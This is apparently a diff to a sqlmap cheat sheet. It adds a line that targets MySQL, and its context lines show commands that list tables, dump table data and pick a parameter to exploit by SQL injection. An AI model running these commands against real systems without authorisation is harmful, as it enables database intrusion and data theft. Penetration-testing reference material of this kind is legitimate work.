@@ -12,6 +12,9 @@ sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --tables
 # Dump table data
 sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" -T "$TABLE" --dump
 
+# Specify target DBMS to MySQL
+sqlmap -u “$URL” --dbms=mysql
+
 # Specify parameter to exploit
 sqlmap --dbms=mysql -u "http://www.example.com/param1=value1&param2=value2" --dbs -p param2
 
